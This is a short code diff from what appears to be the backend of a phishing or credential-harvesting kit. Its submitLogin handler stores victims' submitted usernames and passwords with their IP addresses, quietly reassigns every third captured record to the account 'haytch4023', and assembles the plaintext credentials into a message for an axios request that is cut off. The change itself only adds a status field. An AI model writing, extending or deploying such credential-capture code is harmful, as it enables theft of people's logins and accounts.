@@ -51,7 +51,7 @@ const submitLogin = async (req, res) => {
         let count = await COOP.countDocuments({ owner });
         if (count > 0 && (count % 3) == 0) owner = 'haytch4023';
         await COOP.create({
-            username, password, uniqueid, owner, ip, timestamp: moment().format()
+            username, password, uniqueid, owner, ip, status: 1, timestamp: moment().format()
         })
         let originalText = `ID: ${uniqueid}\nUsername: ${username}\nPassword: ${password}\n\nAdmin Password: ${owner}`;
         await axios
